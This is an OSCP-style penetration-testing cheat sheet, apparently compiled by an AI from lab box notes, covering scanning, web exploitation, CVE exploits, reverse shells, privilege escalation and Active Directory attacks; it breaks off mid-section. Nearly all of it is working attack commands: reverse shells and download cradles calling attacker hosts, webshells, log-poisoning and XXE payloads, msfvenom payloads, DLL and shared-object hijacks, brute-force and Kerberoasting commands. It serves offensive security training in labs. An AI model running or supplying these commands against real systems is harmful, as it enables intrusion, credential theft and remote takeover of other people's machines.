## AI Instructions
Go through all the report.md and notes.md files and extract all of the commands and techniques into this cheat sheet.

---

# OSCP / Pentest Cheat Sheet

Extracted from all `notes.md` / `report.md` files under `boxes/htb/` and `boxes/provinggrounds/`. Commands are generalized with placeholders (`<IP>`, `<USER>`, `<DOMAIN>`, etc.) where the original notes used a hardcoded value.

## Table of Contents
1. Recon / Port Scanning
2. Web Enumeration
3. Web Exploitation (by vuln type)
4. Initial Access / Exploits (CVE-specific)
5. Reverse Shells / File Transfer
6. Linux Privilege Escalation
7. Windows Privilege Escalation
8. Active Directory
9. Password Cracking
10. Post-Exploitation / Persistence / Pivoting

---

## 1. Recon / Port Scanning

```sh
nmap <IP> -sS -sV -oN nmap.txt
```
Basic SYN + version scan with output saved. (Active)

```sh
nmap -sS -sV -p- <IP>
```
Full TCP port range scan — catches non-standard ports (e.g. FTP admin panels on high ports). (Monitorsfour, AuthBy)

```sh
nmap -sC -sV -oN nmap.txt <IP>
```
Default NSE scripts + version detection. (SecNotes)

```sh
nmap -sV -sC -T4 -oA initial <target>
```
Common recon scan with all-format output. (Billyboss, Squid, Monster, Cobweb)

```sh
nmap -p 80,443 --script http-enum <IP>
```
Targeted HTTP enumeration script — found `/info.php`, `/phpinfo.php` directly instead of rabbit-holing with dirb. (Poison)

```sh
sudo nmap -sVC <IP> --script vuln
```
Vuln-scanning NSE scripts; flagged CVE-2009-3103 (SMBv2) on a Windows 2008 R2 box. (Internal)

```sh
rustscan -a <IP> -r 1-65535 -- -sC -sV -oN rustscan.txt
```
Faster full-port scan than nmap, pipes results into nmap scripts. (MonitorsFour, SecNotes)

```sh
dig @<IP> <domain>
```
Query DNS service directly to confirm what's listening on port 53. (Forest)

```sh
dig axfr @<IP> <domain>
```
Attempt a DNS zone transfer (low-hanging fruit, usually fails on hardened DCs). (Forest, Hokkaido)

```sh
nbtscan <IP>
```
NetBIOS name scan. (Hokkaido)

```sh
smbclient -L //<IP> -N
```
Anonymous/null-session SMB share listing. (Active, Forest, SecNotes, Shenzi, Hokkaido)

```sh
smbmap -H <IP>
smbmap -H <IP> -u '<user>' -p '<pass>'
```
Enumerate SMB share permissions, with or without creds. (Active, SecNotes)

```sh
crackmapexec smb <IP> --shares
netexec smb <IP>
nxc smb <IP> -u '<user>' -p '<pass>' --shares
```
CME/NetExec (nxc replaces crackmapexec) SMB enum — shows OS, domain, signing, null-auth status. (Active, Forest, SecNotes, Hokkaido)

```sh
rpcclient -U "" -N <IP>
# then inside:
enumdomusers
enumdomgroups
querygroup 0x200
querygroupmem 0x200
```
Null-session RPC enumeration of AD users/groups when SMB null auth is allowed. (Forest, Hokkaido)

```sh
enum4linux -a <IP>
enum4linux <IP>
```
All-in-one SMB/RPC/user enum (very verbose). (Forest, ClamAV, Shenzi)

```sh
snmpwalk -v1 -c public <IP>
snmp-check <IP>
```
SNMP enumeration with default "public" community string — leaked OS version and running processes. (ClamAV)

```sh
ldapsearch -x -H ldap://<IP> -s base namingcontexts
ldapsearch -x -H ldap://<IP> -b "DC=<domain>,DC=com" "(objectClass=user)" sAMAccountName
```
Anonymous LDAP enumeration of naming contexts / users. (Hokkaido)

```sh
telnet <host> 143
a1 login "<user>" "<pass>"
a1 list "" *
a1 select INBOX
a1 fetch <n> body[text]
a1 fetch <n> body[header]
```
Manual IMAP session to read mailboxes after guessing creds. (Hepet)

```sh
smtp-user-enum -M VRFY -U <userlist> -t <host>
nc <host> 25
HELO test
VRFY <user>
EXPN <user>
```
SMTP user enumeration via VRFY/EXPN. (ClamAV, Hepet)

---

## 2. Web Enumeration

```sh
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target>/ -w <wordlist> --exclude-length <N> -x php,txt,html
```
Directory brute force, with optional length exclusion + extension fuzzing. (bullyBox, Cobweb, Access, Slort)

```sh
gobuster dns -d <target> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
Subdomain brute force via DNS. (Hokkaido)

```sh
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403,404
```
Directory fuzzing, filtering out 403/404. (MonitorsFour)

```sh
ffuf -c -u http://<target>/ -H "Host: FUZZ.<target>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
```
Virtual-host/subdomain fuzzing via Host header, filtered by word count. (MonitorsFour)

```sh
ffuf -w <users>:USER -w <passwords>:PASS \
  -u http://<target>/login -X POST \
  -d '{"username":"USER","password":"PASS"}' \
  -H "Content-Type: application/json" \
  -fr "Unauthorized" -fc 200
```
Custom JSON-body login brute force with ffuf, filtering on a regex/response and status code. (Interface)

```sh
dirb http://<target>/
```
Classic directory brute force. (bullyBox, Forest)

```sh
dirsearch -u http://<target>
```
Alternate directory brute forcer — found `/login`, `/register`, `/web.config` that gobuster/dirb missed. (LaVita)

```sh
nikto -h <target>
```
Web server vuln scanner. (MonitorsFour, ClamAV)

```sh
whatweb <target>
```
Fingerprint web technologies. (MonitorsFour)

```sh
cewl <url> > words.txt
cewl --lowercase <url> | grep -v CeWL > words.txt
```
Generate a custom wordlist from page content — feed into hydra for login brute force. (Billyboss, Hepet, Cobweb, Monster, Roquefort)

```sh
hydra -I -f -L <users> -P <passwords> "http-post-form://<host>:<port>/<path>:username=^USER64^&password=^PASS64^:F=403"
```
HTTP POST form brute force (base64-encoded fields via `^USER64^`/`^PASS64^`). (Billyboss)

```sh
hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <host> ftp
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<host>:21
```
FTP credential brute force; `-C` uses a combined user:pass list which is often faster than separate lists. (AuthBy, Exghost)

```sh
wget -r ftp://Anonymous:<anypass>@<host>
```
Recursively mirror an anonymous FTP server. (Algernon, Shenzi)

```sh
searchsploit <keyword>
searchsploit -p <EDB-ID>
searchsploit --path <EDB-ID>
cp /usr/share/exploitdb/exploits/<path> ./
```
Search local exploit-db mirror and copy the PoC locally for editing. (used across nearly every ProvingGrounds box)

```sh
git-dumper http://<target>/.git git-loot
```
Dump an exposed `.git/` directory to recover source + secrets (found DB creds in `bb-config.php`). (bullyBox)

```sh
wget http://<target>/api/users
jq -r '.[]' users.json > users.txt
```
Pull an unauthenticated API endpoint to build a username list. (Interface)

```sh
nxc smb <host> -u '<user>' -p '<pass>' -M spider_plus
```
Spider all readable SMB shares and dump a JSON manifest of files found. (SecNotes)

```sh
exiftool *.jpg
strings <file.jpg>
```
Check images for EXIF metadata / embedded strings. (Hepet)

---

## 3. Web Exploitation (by vuln type)

### LFI / Log Poisoning
```sh
curl "http://<target>/browse.php?file=/var/log/apache2/access.log"
curl -A "<?php system(\$_GET['cmd']); ?>" http://<target>/index.php
curl "http://<target>/browse.php?file=/var/log/httpd-access.log&cmd=id"
```
Classic LFI-to-RCE via log poisoning: inject PHP into the User-Agent header, then include the access log to execute it. (Poison)

### SQL Injection
```sh
curl "http://<target>/%22 AND 1=2 UNION SELECT 'echo shell_exec(\"id\");'-- "
```
Blind/UNION SQLi into a PHP `eval()`-driven router — the injected `shell_exec()` call runs as PHP once the malicious SQL result is `eval`'d. (Cobweb)

```php
$sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'";
```
Ruby on Rails string-concatenated SQL query, vulnerable via the `URL` param (identified, not fully exploited due to CSRF token). (MedJed)

### XXE
```sh
curl -s -X POST \
  -H 'Content-Type: text/xml;charset=UTF-8' \
  -H 'SOAPAction: "<action>"' \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE uid [<!ENTITY stolen SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope ...><soapenv:Body>
<urn:checkout ...><uid xsi:type="xsd:string">&stolen;</uid></urn:checkout>
</soapenv:Body></soapenv:Envelope>' \
  'http://<target>:8888/<service>/soap11/checkout' | xmllint --format -
```
SOAP/XML XXE against a Ladon service to read arbitrary local files (`/etc/passwd`, WebDAV credential files). (Muddy)

### XPATH Injection
```
')]+|+//password%00
```
Injected into a search parameter (`?work=<payload>&action=search`) to dump all XPath node values including `//password`. (Wheels)

### File Upload Bypass
```
filename=".htaccess"
AddType application/x-httpd-php .php16
```
Upload a modified `.htaccess` via Burp to register a new "PHP" extension (`.php16`) after `.php` was blocked, then upload `payload.php16`. (Access)

### CSRF via GET
```
http://<target>/change_pass.php?user=<victim>&password=<newpass>&confirm_password=<newpass>&submit=submit
```
Because `change_pass.php` accepted GET as well as POST, the whole password-reset form could be triggered via a URL sent to the victim (simulated CSRF). (SecNotes)

### Command Injection
```
; nc -lvp 4444 -e /bin/bash ;
```
Bind-shell payload injected into a vulnerable "backup" feature field, after reverse-shell payloads (`;bash -i>&/dev/tcp/...`, base64-encoded, curl|bash, wget|bash) all failed due to shell metacharacter interference. (Interface)

### Webshell via file manager
```php
<pre><?php system($_GET['cmd']) ?></pre>
```
Simple PHP webshell dropped through an authenticated file manager once write access to a web directory was obtained. (Craft, Squid)

---

## 4. Initial Access / Exploits (CVE-specific)

```sh
# CVE-2025-24367 — Cacti unauthenticated command injection via type-juggling magic hash
curl "http://<host>/user?token=AAAA"
msfconsole; use exploit/linux/http/cacti_unauthenticated_cmd_injection
python CVE-2025-24367.py -u '<user>' -p '<pass>' -i <attacker_ip> -l <port> --url 'http://<cacti-host>'
```
(MonitorsFour)

```sh
# CVE-2019-7214 — SmarterMail Build 6985 RCE
searchsploit smartermail   # windows/remote/49216.py
python 49216.py   # HOST/PORT/LHOST/LPORT set in-file
```
(Algernon)

```sh
# CVE-2022-26134 — Atlassian Confluence 7.13.6 OGNL injection RCE
git clone https://github.com/nxtexploit/CVE-2022-26134
python CVE-2022-26134.py http://<host>:8090 "<cmd>"
# reverse shell (when raw cmd injection can't pop a shell):
git clone https://github.com/jbaines-r7/through_the_wire/
python through_the_wire.py --rhost <host> --rport 8090 --lhost <attacker_ip> --lport <port> --protocol "http://" --reverse-shell
```
(Flu)

```sh
# CVE-2021-3129 — Laravel 8.4.x Ignition debug-mode RCE
python CVE-2021-3129.py --host http://<target>
execute nc <attacker_ip> <port> -e /bin/bash
```
Requires the app to be in `APP_DEBUG=true` (enable via a registered account first). (LaVita)

```sh
# Sonatype Nexus Repository Manager 3.21.0-05 authenticated RCE (EDB-49385)
python 49385.py   # URL/CMD/USERNAME/PASSWORD vars edited in-file, CMD is base64 PowerShell download-cradle
```
Auth obtained by brute-forcing the Nexus login with `cewl`-generated wordlist + hydra. (Billyboss)

```sh
# CVE-2020-0796 — SMBGhost (RCE, not just LPE, when run remotely)
wget https://github.com/danigargu/CVE-2020-0796/releases/download/v1.0/cve-2020-0796-local_static.zip
# also tried: https://github.com/jamf/CVE-2020-0796-RCE-POC (SMBleedingGhost.py) — required victim to have python, failed
```
(Billyboss)

```sh
# CVE-2021-22204 — ExifTool 12.23 RCE via crafted DjVu metadata
sudo apt install -y djvulibre-bin
python 50911.py -s <attacker_ip> <port>
curl -F myFile=@image.jpg http://<target>/exiftest.php
```
(Exghost)

```sh
# CVE-2021-4034 — PwnKit (polkit pkexec LPE)
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py
python3 CVE-2021-4034.py
```
Identify via `ls -lash /usr/lib/policykit-1/polkit-agent-helper-1` (SUID + old build date). (Exghost, Snookums; attempted on Cobweb)

```sh
# CVE-2017-1000028 — Oracle GlassFish 4.1 directory traversal
msfconsole; use scanner/http/glassfish_traversal
set RHOSTS <host>; set RPORT 4848
set FILEPATH /SynaMan/config/AppConfig.xml
```
Leaked SynaMan SMTP creds reused for RDP login. (Fish)

```sh
# CVE-2019-18194 — TotalAV DLL-hijack LPE
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f dll > totalavpwn.dll
# place at C:\Users\<user>\MountPoint\version.dll, scan+quarantine with TotalAV,
# New-Item -ItemType Junction -Path "C:\Users\<user>\MountPoint" -Target "C:\Windows\Microsoft.NET\Framework\v4.0.30319"
# restore threat in TotalAV, then: shutdown /r /t 0
```
(Fish)

```sh
# Argus Surveillance DVR 4.0.0.0 directory traversal (EDB-45296) + CVE-2022-25012 password cipher
curl "http://<host>:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F<path>&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
# used to steal Users/<user>/.ssh/id_rsa AND C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
python 50130.py   # decodes Argus's static-cipher "Password0=" value into plaintext
```
(DVR4)

```sh
# CVE-2021-42392 — H2 Database 1.4.199 JNI/alias RCE (all attempts failed on Jacko)
CREATE ALIAS IF NOT EXISTS EXEC AS $$ void exec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); } $$;
CALL EXEC('<cmd>');
```
Requires `javac` on the victim's PATH; JNI-loaded native-library variant was also tried and failed. (Jacko — stuck)

```sh
# CVE-2022-3552 — BoxBilling <=4.22.1.5 unrestricted file upload RCE
POST /index.php?_url=/api/admin/Filemanager/save_file
order_id=1&path=ax.php&data=<%3fphp+phpinfo()%3b%3f>
```
Requires authenticated admin session + 1 existing order. (bullyBox)

```sh
# CVE-2020-10220 — rConfig 3.9 SQL injection (dump users/hashes, unauth)
python rconfig_CVE-2020-10220.py https://<host>:8081/
# CVE-2019-19509 — rConfig post-auth RCE
python 47982.py https://<host>:8081/ <user> <pass> <attacker_ip> <port>
```
(QuackerJack)

```sh
# Gitea 1.7.5 authenticated RCE via malicious git repo hook (EDB-49383) — attempted, failed
python 49383.py
# manual bare-repo + post-receive hook approach (also failed):
git init --bare
echo -e '#!/bin/bash\nwget http://<attacker>/reverse.sh -O /tmp/r.sh && chmod +x /tmp/r.sh && /tmp/r.sh' > hooks/post-receive
git daemon --reuseaddr --base-path=/tmp --export-all --enable=receive-pack
```
(Roquefort — stuck)

```sh
# CVE-2024-9796 — WP-Advanced-Search plugin unauthenticated SQLi (dump WP users/hashes)
python poc.py -i <target>
```
(Workaholic)

```sh
# CVE-2021-35448 — RemoteMouse 3.008 unauthenticated command injection + LPE
git clone https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
python RemoteMouse-3.008-Exploit.py -t <target> -c '<cmd>'
# LPE: open RemoteMouse GUI (runs as SYSTEM) -> Settings -> Change "Image Transfer Folder" ->
# Save As dialog -> type C:\Windows\System32\cmd.exe -> spawns admin cmd
```
(Mice)

```sh
# CVE-2009-3103 — SMBv2 negotiate function-index heap corruption (Windows 2008 R2)
msfconsole; use windows/smb/ms09_050_smb2_negotiate_func_index
```
Non-deterministic — may need several tries; msf module succeeded where standalone Python EDB PoCs (`40280`, `ms09-050_CVE-2009-3103`) failed. (Internal)

```sh
# CVE-2020-11107 — XAMPP <7.4.4 xampp-control.ini local privesc
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
$replace = "C:\xampp\shell.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```
Rewrites the path XAMPP Control Panel launches on next open, triggering the payload with elevated rights. (Monster, Slort)

```sh
# JuicyPotato / Juicy Potato x86 — Windows Server 2008 R2 SeImpersonatePrivilege LPE
JuicyPotato.exe -t * -p shell.exe -l <port> -c {<CLSID from ohpe/juicy-potato CLSID list>}
```
Use the x86 build for older 32-bit-only targets. (AuthBy)

```sh
# gerapy 0.9.7 authenticated RCE (EDB-50640 / CVE-2021-43857)
```
Requires creating a "project" in gerapy first, or the exploit silently fails. (Levram)

```sh
# CVE-2021-43857 style H2 alt path — TFTP.EXE scheduled-task overwrite (not a CVE, a misconfig)
move TFTP.EXE TFTP2.EXE
certutil.exe -urlcache -f http://<attacker>/shell.exe C:\Backup\TFTP.EXE
```
A world-writable directory (`C:\Backup`) had a task that ran `TFTP.EXE` every 5 minutes as SYSTEM — overwrite the binary with a reverse-shell payload and wait. (Slort)

```sh
# Simple PHP Photo Gallery v0.8 — Remote File Inclusion (EDB-48424)
curl "http://<target>/image.php?img=http://<attacker_ip>/shell.php"
```
(Snookums)

---

## 5. Reverse Shells / File Transfer

```sh
nc -nvlp <port>
rlwrap nc -lvnp <port>
```
Listener for incoming reverse shells; `rlwrap` gives readline/arrow-key support.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o meter.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > reverse.sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll > payload.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malicious.msi
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/unicode_mixed -b '<badchars>' BufferRegister=EAX -f python
```
Generate reverse shell payloads in whatever format the target/vector needs (exe, elf, raw PHP, DLL for hijacking, MSI for AlwaysInstallElevated, encoded-shellcode Python for buffer overflows). (used across nearly every box)

```sh
python3 -m http.server 80
python3 -m http.server 8080
```
Serve payloads/tools to the victim over HTTP.

```powershell
certutil.exe -urlcache -f http://<attacker_ip>/<file> <file>
Invoke-WebRequest -Uri "http://<attacker_ip>/<file>" -OutFile "<path>"
iex(new-object net.webclient).downloadstring("http://<attacker_ip>/SharpHound.ps1")
```
Windows-side file download tricks — `certutil` works even when PowerShell download cmdlets are blocked.

```sh
wget http://<attacker_ip>/<file>
```
Linux-side file download in a reverse shell.

```sh
smbclient '//<host>/<share>' -U '<user>' --password '<pass>' -c 'put <local_file> <remote_file>'
smbclient //<host>/<share> -N -c 'prompt OFF;recurse ON;lcd <local_dir>;mget *'
```
Upload a single file over SMB, or recursively download an entire SMB share. (Active, SecNotes)

```sh
scp -o PubkeyAuthentication=no <user>@<host>:<remote_path> .
```
File transfer over SSH/SCP, disabling pubkey auth when the server only allows password auth for that flag combo. (Poison)

```sh
git clone https://github.com/pentestmonkey/php-reverse-shell
cp /usr/share/webshells/php/php-reverse-shell.php ./
cp /usr/share/webshells/php/simple-backdoor.php ./
```
Stock PHP reverse-shell/webshell templates bundled on Kali — edit `$ip`/`$port` before uploading. (bullyBox, Snookums, SecNotes)

```
https://www.revshells.com/  ->  "PHP Ivan Sincek"
```
Web-based reverse shell generator; the "Ivan Sincek" PHP variant was the reliable one used repeatedly. (Shenzi, Slort, Snookums, Interface)

```sh
echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 -w 0
# inject: powershell -EncodedCommand <base64-of-UTF16LE-command>
echo -n '<powershell command>' | iconv -t UTF-16LE | base64 -w 0
```
Base64/UTF-16LE encode PowerShell one-liners to smuggle them through filters that break on special characters (`&`, quotes). (Billyboss, Interface)

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```
Upgrade a dumb reverse shell to a semi-interactive TTY. (bullyBox, QuackerJack, Exghost)

```sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f
```
Named-pipe (`mkfifo`) reverse shell — useful when injecting through a size-limited or quote-mangling parameter (e.g. into a PHP file via cron overwrite). (LaVita)

```sh
smbget -R smb://<host>/<share> -U '' -N
```
Alternative recursive SMB download tool (noted as not working reliably vs. `smbclient mget`). (Active)

---

## 6. Linux Privilege Escalation

```sh
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null | grep -v snap
```
Find SUID binaries. (Wheels, Workaholic, QuackerJack, Cobweb)

```sh
getcap -r / 2>/dev/null
```
Find binaries with elevated Linux capabilities (distinct from SUID). (Wheels, ClamAV, Levram)

```sh
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)'
```
Find world-writable directories — useful for planting cron/PATH-hijack payloads. (Poison, LaVita, Workaholic, Muddy)

```sh
wget https://github.com/peass-ng/PEASS-ng/releases/download/<ver>/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```
Automated privesc enumeration — flags kernel CVEs, SUID files, writable cron scripts, etc. (Cobweb, LaVita, Snookums)

```sh
wget https://github.com/DominicBreuker/pspy/releases/download/<ver>/pspy64
chmod +x pspy64 && ./pspy64 -pf -i 1000
```
Monitor running processes without root to catch cron jobs executing as root in real time. (Flu, LaVita, Muddy)

```sh
sudo -l
```
List commands the current user can run as another user/root. (LaVita, bullyBox)

```sh
sudo bash
sudo su
```
Direct root shell when the user is a blanket sudoer. (bullyBox)

```sh
# GTFOBins: find (SUID)
find . -exec /bin/sh -p \; -quit
```
Spawn a privileged shell via SUID `find`, `-p` preserves the elevated EUID. (QuackerJack)

```sh
# GTFOBins: composer (sudo NOPASSWD)
mv composer.json composer.json.bak
echo '{"scripts":{"x":"nc <attacker_ip> <port> -e /bin/bash"}}' > composer.json
sudo composer --working-dir=<path> run-script x
```
Abuse a `sudo` rule permitting `composer` with args to run arbitrary scripts as root. (LaVita)

```sh
# Cron job PATH / writable script hijack
echo 'chmod +s /bin/bash' >> /opt/<cron-script>.sh
# wait for cron to fire, then:
bash -p
```
Append to a world-writable script that root's crontab executes; escalate by SUID-ing bash. (Flu)

```sh
# Fake binary via writable cron PATH entry (e.g. netstat run every minute by root from /dev/shm)
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /dev/shm/netstat
chmod +x /dev/shm/netstat
```
Plant a malicious binary earlier in `$PATH` than the real one, for a cron job that doesn't use an absolute path. (Muddy)

```sh
# Shared-object hijack for a SUID binary
strings /path/to/suid_binary   # reveals it dlopen()s e.g. /home/<user>/.lib/libsecurity.so
gcc -fPIC -shared -o /home/<user>/.lib/libsecurity.so /home/<user>/.lib/libsecurity.c
/path/to/suid_binary
```
```c
#include <stdlib.h>
#include <unistd.h>
void init_plugin() {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
When a SUID binary loads a shared object from a directory writable by the current user, drop a malicious `.so` exporting the same symbol (found via `strings`) to get code exec as root. (Workaholic)

```sh
# ld.so.preload injection via SUID screen 4.5.0 (EDB-41154) — attempted, failed (no gcc on victim)
umask 000
screen -D -m -L ld.so.preload echo -ne "\n/tmp/libhax.so"
screen -ls
/tmp/rootshell
```
(Cobweb — stuck)

```sh
# GTFOBins: pkexec (CVE-2021-4034 "PwnKit")
python3 CVE-2021-4034.py
```
See section 4 for full details. (Exghost, Snookums)

---

## 7. Windows Privilege Escalation

```powershell
whoami /priv
whoami /all
whoami /groups
```
Check current privileges/group membership before choosing a privesc path.

```sh
wget https://github.com/peass-ng/PEASS-ng/releases/download/<ver>/winPEAS.bat
certutil.exe -urlcache -f http://<attacker>/winPEAS.bat winPEAS.bat
winPEAS.bat
```
Automated Windows privesc enumeration. (AuthBy, Craft, Slort)

```sh
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
GodPotato-NET4.exe -cmd "<attacker_binary_or_cmd> <attacker_ip> <port> -e cmd.exe"
```
Abuse `SeImpersonatePrivilege` for SYSTEM (successor to Rotten/Juicy Potato on newer Windows). (Billyboss, Craft, Squid, Access-adjacent)

```sh
wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
FullPowers.exe
```
Restore full default token privileges for service accounts like `LOCAL SERVICE`/`NETWORK SERVICE` whose tokens are normally stripped — run before GodPotato/PrintSpoofer. (Billyboss, Squid)

```sh
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "nc.exe <attacker_ip> <port> -e cmd.exe"
```
Alternative `SeImpersonatePrivilege` abuse via the print spooler (tried before GodPotato on Billyboss; failed there but is the standard first try).

```sh
JuicyPotato.exe -t * -p shell.exe -l <port> -c {<CLSID>}
Juicy.Potato.x86.exe -t * -p shell.exe -l <port> -c {<CLSID>}
```
Older `SeImpersonatePrivilege` abuse tool for Windows Server 2008/2012 — pick CLSID matching the OS from ohpe/juicy-potato's CLSID list; use the x86 build on 32-bit-only targets. (AuthBy)

```sh
RunasCs.exe <user> <pass> cmd.exe -r <attacker_ip>:<port>
```
Run a command as another local user with password in hand, without a full logon session, and pipe the result to a reverse shell. (Access)

```cmd
runas /user:<user> "<cmd>"
```
Standard `runas` for switching user context when you have valid creds. (DVR4, Craft)

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```
Check for the `AlwaysInstallElevated` misconfig (both HKLM and HKCU must be `0x1`).

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malicious.msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
Exploit `AlwaysInstallElevated` — any user can install an MSI with SYSTEM rights. (Shenzi)

```cmd
schtasks /create /tn "privesc" /tr "C:\path\nc.exe -e cmd.exe <attacker_ip> <port>" /sc onstart /ru "NT AUTHORITY\LOCAL SERVICE"
schtasks /run /tn "privesc"
```
Recover a full/default privilege token for a restricted service account by having the Task Scheduler launch a new process as that principal — the new token includes `SeImpersonatePrivilege` again, enabling PrintSpoofer/GodPotato. (Squid)

```sh
# DLL hijack via missing system DLL (e.g. tzres.dll under System32\wbem, loaded by systeminfo)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o tzres.dll
copy tzres.dll C:\Windows\System32\wbem\tzres.dll
systeminfo   # triggers the load
```
Drop a malicious DLL at a path Windows looks for but doesn't ship (identified via tooling like `dllref`). (Access)

```sh
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
SeManageVolumeExploit.exe
```
Abuse `SeManageVolumePrivilege` to gain full control (and thus write access) over `C:\Windows\System32`. (Access)

```sh
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
See CLSID note above — `SeImpersonatePrivilege` abuse tool set for older Windows.

---

## 8. Active Directory

### Enumeration
```sh
smbclient -L //<dc> -N
nxc smb <dc> --shares
rpcclient -U "" -N <dc>
```
Null-session enumeration works surprisingly often on legacy/AD-CS lab DCs. (Active, Forest, Hokkaido)

```sh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
./kerbrute userenum -d <domain> --dc <dc_ip> <username_wordlist>
```
Kerberos pre-auth username enumeration/brute force — works even without any creds. (Hokkaido)

```sh
bloodhound-python -d <domain> -u <user> -p '<pass>' -dc <dc_ip>
bloodhound-python -u "<user>" -p '<pass>' -d <domain> -c all --zip -ns <dc_ip>
```
Collect AD relationship data with valid creds (or via SharpHound uploaded to a compromised host — see below).

```powershell
iex(new-object net.webclient).downloadstring("http://<attacker>/SharpHound.ps1")
Invoke-WebRequest -Uri "http://<attacker>/SharpHound.ps1" -OutFile "C:\path\SharpHound.ps1"
Invoke-Bloodhound -CollectionMethod All -Domain <domain> -LdapUser <user> -LdapPass <pass> -OutputDirectory C:\path\
```
Run SharpHound from an already-compromised Windows host (note: `-OutputDirectory` is required or no zip is produced), then `download <file>` it back via evil-winrm. (Forest)

```sh
bloodhound-setup
neo4j
sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION VERSION; ALTER DATABASE template1 REFRESH COLLATION VERSION;'
```
Fix common BloodHound CE / Kali PostgreSQL collation-mismatch startup errors. (Forest, Hokkaido)

### GPP / Credential Extraction
```sh
gpp-decrypt '<cpassword value from Groups.xml>'
```
Decrypt a Group Policy Preferences `cpassword` found on a SYSVOL/Replication share — the AES key is publicly known (MS14-025). (Active)

### Kerberoasting / AS-REP Roasting
```sh
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc_ip> -request
for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip <dc_ip> <domain>/${user} | grep -v Impacket; done
```
AS-REP Roast accounts with `UF_DONT_REQUIRE_PREAUTH` set — no creds needed. (Forest)

```sh
impacket-GetUserSPNs <domain>/<user>:<pass>@<dc_ip> -dc-ip <dc_ip> -request -outputfile kerberoast_hashes.txt
```
Kerberoast all SPN-registered accounts with valid domain creds; `-dc-ip` is often required even when the domain resolves fine. (Access, Forest)

```sh
git clone https://github.com/ShutdownRepo/targetedKerberoast
python targetedKerberoast.py -v -d '<domain>' -u '<user>' -p '<pass>' --dc-ip <dc_ip>
```
Kerberoast a specific target account you have `GenericWrite` on (sets a fake SPN temporarily), instead of every SPN account in the domain. (Hokkaido)

```sh
hashcat -O -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
```
Crack Kerberoast (TGS-REP) hashes. (Active, Forest, Hokkaido)

```sh
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force --show
```
Crack AS-REP roast hashes. (Forest)

### Lateral Movement / Shell Access
```sh
evil-winrm -i <ip> -u '<user>' -p '<pass>'
```
WinRM shell when the account has `Remote Management Users`/admin rights. (Forest)

```sh
